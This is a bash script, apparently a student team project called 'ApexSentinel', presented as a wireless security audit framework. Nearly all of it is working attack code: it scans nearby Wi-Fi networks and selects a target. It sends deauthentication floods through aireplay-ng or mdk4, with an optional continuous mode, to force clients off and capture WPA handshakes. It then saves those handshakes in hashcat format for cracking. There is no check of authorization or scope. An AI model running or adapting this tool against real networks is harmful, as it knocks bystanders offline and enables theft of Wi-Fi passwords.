#!/usr/bin/env bash
# ╔═══════════════════════════════════════════════════════════════════════════════╗
# ║                                                                               ║
# ║        █████╗ ██████╗ ███████╗██╗  ██╗   ███████╗███████╗███╗   ██╗████████╗  ║
# ║       ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝  ║
# ║       ███████║██████╔╝█████╗   ╚███╔╝    ███████╗█████╗  ██╔██╗ ██║   ██║     ║
# ║       ██╔══██║██╔═══╝ ██╔══╝   ██╔██╗    ╚════██║██╔══╝  ██║╚██╗██║   ██║     ║
# ║       ██║  ██║██║     ███████╗██╔╝ ██╗   ███████║███████╗██║ ╚████║   ██║     ║
# ║       ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝     ║
# ║                                                                               ║
# ║                     Wireless Security Audit Framework                         ║
# ║                                                                               ║
# ║                                 Team                                          ║
# ║                       Ahmed Emad  |  Mohamed Nagi                             ║
# ║                   Abdallah Ahmed  |  Abdallah Mohamed                         ║
# ║                                                                               ║
# ╚═══════════════════════════════════════════════════════════════════════════════╝

set -o pipefail

# ---------- COLORS ----------
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'
DIM='\033[2m'; RESET='\033[0m'

# ---------- GLOBALS ----------
INTERFACE=""; MON_IFACE=""
T_BSSID=""; T_CH=""; T_ESSID=""; T_ENC=""; T_BAND=""
HS_FILE=""; HS_22000=""; WL=""; HAS_HS=false; MON_OWN=false
CAP_DIR="/home/owl"
TMP="/tmp/apex_$$"

declare -a BSSIDS CHS ESSIDS SIGS ENCS BANDS

# ---------- CLEANUP ----------
clean() {
    local rc=${1:-0}
    echo -e "\n  ${YELLOW}[*] Cleaning up...${RESET}"
    for p in $(jobs -p 2>/dev/null); do kill "$p" 2>/dev/null; done
    [[ "$MON_OWN" == "true" && -n "$MON_IFACE" ]] && airmon-ng stop "$MON_IFACE" &>/dev/null
    systemctl restart NetworkManager &>/dev/null || true
    rm -rf "$TMP" 2>/dev/null
    clear
    echo -e "\n  ${GREEN}[OK] Session Finished${RESET}"
    echo -e "  ${DIM}Team: Ahmed Emad | Mohamed Nagi | Abdallah Ahmed | Abdallah Mohamed${RESET}\n"
    exit "$rc"
}
trap 'echo -e "\n  ${YELLOW}[!] Interrupted${RESET}"; clean 130' SIGINT
trap 'clean 143' SIGTERM

# ---------- HELPERS ----------
pk() { echo -e "${DIM}[*] Press Enter...${RESET}"; read -r -s; }
ri() { echo -ne "${CYAN}$1${RESET} "; read -r "$2"; }

# ---------- BANNER ----------
banner() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF"
        █████╗ ██████╗ ███████╗██╗  ██╗   ███████╗███████╗███╗   ██╗████████╗
       ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝
       ███████║██████╔╝█████╗   ╚███╔╝    ███████╗█████╗  ██╔██╗ ██║   ██║
       ██╔══██║██╔═══╝ ██╔══╝   ██╔██╗    ╚════██║██╔══╝  ██║╚██╗██║   ██║
       ██║  ██║██║     ███████╗██╔╝ ██╗   ███████║███████╗██║ ╚████║   ██║
       ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝
EOF
    echo -e "${RESET}"
    echo -e "${YELLOW}${BOLD}  Developed by:${RESET}"
    echo -e "    ${GREEN}• AHMED EMAD         • MOHAMED NAGY${RESET}"
    echo -e "    ${GREEN}• ABDALLAH NEGEADA   • ABDALLAH SALMAN${RESET}"
    echo -e "${DIM}       ─────────────────────────────────────────────────────${RESET}"
}

# ---------- DEPS ----------
check_deps() {
    echo -e "${YELLOW}[*] Checking tools...${RESET}"
    # تم حذف reaver, bully لأنها لم تعد مستخدمة
    for cmd in aircrack-ng airodump-ng aireplay-ng airmon-ng xterm iw hcxpcapngtool ethtool; do
        command -v "$cmd" &>/dev/null || { echo -e "${RED}[X] Install: apt install $cmd${RESET}"; exit 1; }
    done
    echo -e "${GREEN}[OK] All tools available${RESET}"
    sleep 1
}

# ---------- INTERFACE ----------
select_iface() {
    local ifaces=()
    for d in /sys/class/net/*/device/uevent; do
        local iface=$(echo "$d" | cut -d'/' -f5)
        iwconfig "$iface" 2>/dev/null | grep -q "IEEE" && ifaces+=("$iface")
    done
    [[ ${#ifaces[@]} -eq 0 ]] && {
        while IFS= read -r l; do [[ "$l" =~ ^([a-zA-Z0-9]+)[[:space:]]+IEEE ]] && ifaces+=("${BASH_REMATCH[1]}"); done < <(iwconfig 2>/dev/null)
    }
    [[ ${#ifaces[@]} -eq 0 ]] && { echo -e "${RED}[X] No wireless card${RESET}"; exit 1; }

    while true; do
        banner
        echo -e "${CYAN}┌─ Select Interface ─────────────────────────┐${RESET}"
        for i in "${!ifaces[@]}"; do
            echo -e "  ${GREEN}[${i}]${RESET} ${WHITE}${ifaces[$i]}${RESET}"
        done
        echo -e "${CYAN}│${RESET}  ${RED}[q]${RESET} Quit"
        echo -e "${CYAN}└─────────────────────────────────────────────┘${RESET}"
        ri "Choice: " c
        [[ "$c" == "q" ]] && clean 0
        [[ "$c" =~ ^[0-9]+$ && $c -lt ${#ifaces[@]} ]] && { INTERFACE="${ifaces[$c]}"; return; }
    done
}

enable_mon() {
    echo -e "${YELLOW}[*] Enabling monitor mode...${RESET}"
    airmon-ng check kill &>/dev/null
    airmon-ng stop "${INTERFACE}mon" &>/dev/null
    airmon-ng start "$INTERFACE" &>/dev/null
    sleep 3

    # Find monitor interface
    MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | head -1 | awk '{print $1}')

    if [[ -n "$MON_IFACE" ]]; then
        MON_OWN=true
        ip link set "$MON_IFACE" up 2>/dev/null
        echo -e "${GREEN}[OK] Monitor: $MON_IFACE${RESET}"
        sleep 1
        return 0
    else
        echo -e "${RED}[X] Monitor mode failed${RESET}"
        exit 1
    fi
}

# ---------- SCAN (Continuous until Ctrl+C) ----------
scan() {
    banner
    echo -e "${YELLOW}[*] Scanning for networks...${RESET}"
    echo -e "${YELLOW}[*] Close the xterm window when done${RESET}\n"

    mkdir -p "$TMP"
    local base="$TMP/scan"

    # Kill any existing scan
    killall -9 airodump-ng 2>/dev/null

    # Start scan
    xterm +hold -geometry 130x40 -T "ApexSentinel Scanner [Close when done]" \
        -e "airodump-ng --band abg -w '${base}' --output-format csv ${MON_IFACE}" &
    local pid=$!

    # Wait for user to close xterm
    wait $pid 2>/dev/null

    echo -e "\n${YELLOW}[*] Processing results...${RESET}"
    sleep 2

    # Find the CSV file
    local csv=""
    for f in "$TMP"/*.csv; do
        [[ -f "$f" ]] && { csv="$f"; break; }
    done

    if [[ -f "$csv" ]]; then
        BSSIDS=(); CHS=(); ESSIDS=(); SIGS=(); ENCS=(); BANDS=()

        # Read networks
        local in_stations=false
        while IFS= read -r l; do
            [[ "$l" =~ ^"Station MAC" ]] && { in_stations=true; continue; }
            $in_stations && continue
            [[ "$l" =~ ^BSSID || "$l" =~ ^, || -z "${l// /}" ]] && continue

            local bssid=$(echo "$l" | cut -d',' -f1 | xargs)
            local ch=$(echo "$l" | cut -d',' -f4 | xargs)
            local pwr=$(echo "$l" | cut -d',' -f9 | xargs)
            local enc=$(echo "$l" | cut -d',' -f6 | xargs)
            local essid=$(echo "$l" | cut -d',' -f14 | xargs)

            [[ -z "$ch" || "$ch" == "" ]] && continue
            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue

            [[ -z "$essid" || "$essid" == " " ]] && essid="(Hidden)"
            local band="2.4GHz"
            [[ "$ch" -ge 36 ]] && band="5GHz"

            BSSIDS+=("$bssid")
            CHS+=("$ch")
            ESSIDS+=("$essid")
            SIGS+=("$pwr")
            ENCS+=("$enc")
            BANDS+=("$band")
        done < "$csv"

        rm -rf "$TMP"/*.csv "$TMP"/*.cap "$TMP"/*.log 2>/dev/null

        if [[ ${#BSSIDS[@]} -gt 0 ]]; then
            target_menu
        else
            echo -e "${RED}[X] No networks found${RESET}"
            pk
        fi
    else
        echo -e "${RED}[X] Scan failed - no CSV file${RESET}"
        pk
    fi
}

# ---------- TARGET SELECTION ----------
target_menu() {
    while true; do
        banner
        echo -e "${CYAN}┌───────── Select Target Network ───────────────────────────────────────┐${RESET}"
        printf "  ${BOLD}${WHITE}%-3s %-18s %-4s %-7s %-7s %-25s %s${RESET}\n" "ID" "BSSID" "CH" "Band" "Signal" "ESSID" "Encryption"
        echo -e "  ${DIM}────────────────────────────────────────────────────────────────────────${RESET}"

        for i in "${!BSSIDS[@]}"; do
            local sig=${SIGS[$i]}
            local sc="$GREEN"
            [[ $sig -lt -70 ]] && sc="$RED"
            [[ $sig -ge -70 && $sig -lt -50 ]] && sc="$YELLOW"

            # Signal bars
            local sq=0
            [[ $sig -ge -30 ]] && sq=100
            [[ $sig -le -100 ]] && sq=0
            [[ $sq -eq 0 ]] && sq=$(( (sig + 100) * 100 / 70 ))
            [[ $sq -gt 100 ]] && sq=100
            [[ $sq -lt 0 ]] && sq=0
            local bars=$(( sq / 14 ))
            local bar=""
            for ((b=0; b<bars; b++)); do bar+="|"; done
            for ((b=bars; b<7; b++)); do bar+="."; done

            printf "  ${GREEN}[%2d]${RESET} %-18s %-4s %-7s ${sc}%-3s %-6s${RESET} %-25s %s\n" \
                "$i" "${BSSIDS[$i]}" "${CHS[$i]}" "${BANDS[$i]}" "${SIGS[$i]}" "[${bar}]" \
                "${ESSIDS[$i]:0:25}" "${ENCS[$i]:0:12}"
        done

        echo -e "${CYAN}└────────────────────────────────────────────────────────────────────────┘${RESET}"
        echo ""
        echo -e "  ${YELLOW}[r]${RESET} Rescan  ${YELLOW}[0-$(( ${#BSSIDS[@]}-1 ))]${RESET} Select  ${RED}[b]${RESET} Back"
        ri "Choice: " c

        [[ "$c" == "b" ]] && return
        [[ "$c" == "r" ]] && { scan; return; }
        [[ "$c" =~ ^[0-9]+$ && $c -ge 0 && $c -lt ${#BSSIDS[@]} ]] && {
            T_BSSID="${BSSIDS[$c]}"
            T_CH="${CHS[$c]}"
            T_ESSID="${ESSIDS[$c]}"
            T_ENC="${ENCS[$c]}"
            T_BAND="${BANDS[$c]}"
            iw dev "$MON_IFACE" set channel "$T_CH" 2>/dev/null

            banner
            echo -e "${CYAN}┌─ Target Selected ─────────────────────────────┐${RESET}"
            echo -e "  ${WHITE}ESSID:${RESET}      ${GREEN}$T_ESSID${RESET}"
            echo -e "  ${WHITE}BSSID:${RESET}      ${GREEN}$T_BSSID${RESET}"
            echo -e "  ${WHITE}Channel:${RESET}    ${GREEN}$T_CH${RESET}"
            echo -e "  ${WHITE}Band:${RESET}       ${GREEN}$T_BAND${RESET}"
            echo -e "  ${WHITE}Encryption:${RESET} ${GREEN}$T_ENC${RESET}"
            echo -e "${CYAN}└────────────────────────────────────────────────┘${RESET}"
            pk
            return
        }
    done
}

# ---------- CAPTURE HAND SHAKE (FIXED) ----------
cap_hs() {
    [[ -z "$T_BSSID" ]] && { echo -e "${RED}[X] No target${RESET}"; pk; return; }

    banner
    echo -e "${YELLOW}[*] Capturing handshake for ${T_ESSID}${RESET}\n"

    mkdir -p "$CAP_DIR/$T_ESSID"
    local f="$CAP_DIR/$T_ESSID/hs"

    # Kill any existing airodump
    killall -9 airodump-ng 2>/dev/null
    sleep 1

    # Step 1: Start focused capture
    echo -e "${YELLOW}[*] Starting capture on channel ${T_CH}...${RESET}"
    xterm -geometry 100x28 -T "Capture - $T_ESSID" \
        -e "airodump-ng --bssid $T_BSSID --channel $T_CH -w '${f}' ${MON_IFACE}" &
    local dp=$!
    sleep 5

    # Step 2: Send deauth
    echo -e "${YELLOW}[*] Sending deauth packets...${RESET}"

    if [[ "$T_BAND" == "5GHz" ]]; then
        echo -e "${GREEN}[OK] 5GHz detected - using mdk4${RESET}"
        if command -v mdk4 &>/dev/null; then
            xterm -geometry 80x18 -T "Deauth (5GHz)" -e "mdk4 ${MON_IFACE} d -a ${T_BSSID} -c ${T_CH}; echo; echo 'Done'; read" &
        else
            xterm -geometry 80x18 -T "Deauth" -e "aireplay-ng --deauth 20 -a $T_BSSID $MON_IFACE; echo; echo 'Done'; read" &
        fi
    else
        xterm -geometry 80x18 -T "Deauth" -e "aireplay-ng --deauth 20 -a $T_BSSID $MON_IFACE; echo; echo 'Done'; read" &
    fi
    local ap=$!

    # Step 3: Wait and check
    echo -e "${YELLOW}[*] Waiting 30 seconds...${RESET}"
    sleep 30
    kill $ap 2>/dev/null

    # Find the capture file
    local cap_file=""
    for cf in "$CAP_DIR/$T_ESSID/"*.cap; do
        [[ -f "$cf" ]] && { cap_file="$cf"; break; }
    done

    if [[ -f "$cap_file" ]]; then
        echo -e "${YELLOW}[*] Checking ${cap_file}...${RESET}"

        if aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
            HS_FILE="$cap_file"
            HAS_HS=true
            echo -e "${GREEN}[OK] ${BOLD}Handshake captured!${RESET}"
            echo -e "${GREEN}[OK] File: ${HS_FILE}${RESET}"

            # Convert to hashcat (just for archiving, not for cracking here)
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool "$HS_FILE" -o "${f}.hc22000" 2>/dev/null
                [[ -f "${f}.hc22000" ]] && HS_22000="${f}.hc22000" && echo -e "${GREEN}[OK] Hashcat format saved${RESET}"
            fi
        else
            echo -e "${YELLOW}[!] No handshake yet. More deauth? (y/n):${RESET}"
            read -r m
            if [[ "$m" == "y" ]]; then
                echo -e "${YELLOW}[*] Sending 50 more deauth...${RESET}"
                aireplay-ng --deauth 50 -a "$T_BSSID" "$MON_IFACE" &>/dev/null &
                local ap2=$!
                sleep 25
                kill $ap2 2>/dev/null

                # Check again
                if aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
                    HS_FILE="$cap_file"
                    HAS_HS=true
                    echo -e "${GREEN}[OK] Handshake captured!${RESET}"
                    command -v hcxpcapngtool &>/dev/null && hcxpcapngtool "$HS_FILE" -o "${f}.hc22000" 2>/dev/null
                else
                    echo -e "${RED}[X] No handshake. Try when clients are connected.${RESET}"
                fi
            fi
        fi
    else
        echo -e "${RED}[X] No capture file found${RESET}"
    fi

    kill $dp 2>/dev/null
    killall -9 airodump-ng 2>/dev/null
    pk
}

# ---------- DEAUTH (FIXED for both bands) ----------
do_deauth() {
    [[ -z "$T_BSSID" ]] && { echo -e "${RED}[X] No target${RESET}"; pk; return; }

    banner
    echo -e "${YELLOW}[*] Deauth Attack on ${T_ESSID}${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Deauth All Clients"
    echo -e "  ${RED}[b]${RESET} Back\n"
    ri "Choice: " opt

    [[ "$opt" == "b" ]] && return
    [[ "$opt" != "1" ]] && { echo -e "${RED}[X] Invalid${RESET}"; sleep 1; do_deauth; return; }

    ri "Packets (0=continuous, default 10): " pkt
    pkt=${pkt:-10}

    echo -e "${YELLOW}[*] Launching deauth...${RESET}"

    if [[ "$T_BAND" == "5GHz" ]]; then
        echo -e "${GREEN}[OK] 5GHz mode${RESET}"
        if command -v mdk4 &>/dev/null; then
            xterm -geometry 80x18 -T "Deauth [${T_ESSID}]" -e "
                echo '5GHz Deauth via mdk4';
                echo 'Target: $T_BSSID Channel: $T_CH';
                echo '';
                if [[ $pkt -eq 0 ]]; then
                    echo 'Continuous mode - Press Ctrl+C to stop';
                    mdk4 ${MON_IFACE} d -a ${T_BSSID} -c ${T_CH};
                else
                    mdk4 ${MON_IFACE} d -a ${T_BSSID} -c ${T_CH} -B ${pkt};
                fi;
                echo 'Done'; read" &
        else
            # Use aireplay with -D flag for 5GHz
            xterm -geometry 80x18 -T "Deauth [${T_ESSID}]" -e "
                echo '5GHz Deauth via aireplay';
                echo 'Using -D flag for 5GHz support';
                if [[ $pkt -eq 0 ]]; then
                    echo 'Continuous - Ctrl+C to stop';
                    while true; do aireplay-ng --deauth 5 -a $T_BSSID $MON_IFACE; sleep 1; done;
                else
                    aireplay-ng --deauth $pkt -a $T_BSSID $MON_IFACE;
                fi;
                echo 'Done'; read" &
        fi
    else
        # 2.4GHz
        xterm -geometry 80x18 -T "Deauth [${T_ESSID}]" -e "
            echo '2.4GHz Deauth';
            if [[ $pkt -eq 0 ]]; then
                echo 'Continuous - Ctrl+C to stop';
                while true; do aireplay-ng --deauth 5 -a $T_BSSID $MON_IFACE; sleep 1; done;
            else
                aireplay-ng --deauth $pkt -a $T_BSSID $MON_IFACE;
            fi;
            echo 'Done'; read" &
    fi

    echo -e "${GREEN}[OK] Deauth launched (${pkt} packets)${RESET}"
    pk
}

# ---------- STATUS ----------
status() {
    banner
    echo -e "${CYAN}┌─ Status ─────────────────────────────────────────┐${RESET}"
    echo -e "  ${WHITE}Monitor:${RESET}   ${GREEN}$MON_IFACE${RESET}"
    if [[ -n "$T_BSSID" ]]; then
        echo -e "  ${WHITE}Target:${RESET}    ${GREEN}$T_ESSID${RESET}"
        echo -e "  ${WHITE}BSSID:${RESET}    ${GREEN}$T_BSSID${RESET}"
        echo -e "  ${WHITE}Channel:${RESET}  ${GREEN}$T_CH ($T_BAND)${RESET}"
        echo -e "  ${WHITE}Enc:${RESET}      ${GREEN}$T_ENC${RESET}"
        $HAS_HS && echo -e "  ${WHITE}Handshake:${RESET} ${GREEN}[OK]${RESET}" || echo -e "  ${WHITE}Handshake:${RESET} ${YELLOW}No${RESET}"
    else
        echo -e "  ${WHITE}Target:${RESET}    ${YELLOW}None${RESET}"
    fi
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${RESET}"
    pk
}

# ---------- MAIN ----------
main() {
    while true; do
        banner
        echo -e "${CYAN}┌─ Main Menu ───────────────────────────────────────────┐${RESET}"
        echo -e "${CYAN}│${RESET}  ${WHITE}Interface:${RESET} ${GREEN}${MON_IFACE}${RESET}"
        [[ -n "$T_BSSID" ]] && echo -e "${CYAN}│${RESET}  ${WHITE}Target:${RESET}    ${GREEN}${T_ESSID}${RESET} ${DIM}($T_CH, $T_ENC)${RESET}"
        echo -e "${CYAN}│${RESET}"
        echo -e "${CYAN}│${RESET}  ${GREEN}[1]${RESET} Scan Networks"
        echo -e "${CYAN}│${RESET}  ${GREEN}[2]${RESET} Capture Handshake"
        echo -e "${CYAN}│${RESET}  ${GREEN}[3]${RESET} Deauth Attack"
        echo -e "${CYAN}│${RESET}  ${GREEN}[4]${RESET} Status"
        echo -e "${CYAN}│${RESET}  ${RED}[0]${RESET} Exit"
        echo -e "${CYAN}└────────────────────────────────────────────────────────┘${RESET}"
        ri "Choice: " c

        case $c in
            1) scan ;;
            2) cap_hs ;;
            3) do_deauth ;;
            4) status ;;
            0) clean 0 ;;
            *) echo -e "${RED}[X] Invalid${RESET}"; sleep 1 ;;
        esac
    done
}

# ---------- START ----------
[[ $EUID -ne 0 ]] && { echo -e "${RED}[X] Run as root${RESET}"; exit 1; }
check_deps
select_iface
enable_mon
main
